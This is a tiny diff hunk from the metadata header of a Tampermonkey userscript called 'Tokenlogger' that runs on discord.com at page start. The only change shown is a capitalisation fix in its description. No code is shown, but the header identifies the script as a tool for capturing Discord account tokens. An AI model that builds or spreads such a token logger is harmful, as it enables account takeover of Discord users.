@@ -2,7 +2,7 @@
 // @name         Tokenlogger
 // @namespace    http://tampermonkey.net/
 // @version      1.0
-// @description  A simple Tokenlogger for Tampermonkey. (Browser Extension)
+// @description  A simple tokenlogger for Tampermonkey. (Browser Extension)
 // @author       Lyzev
 // @run-at       document-start
 // @match        https://discord.com/*
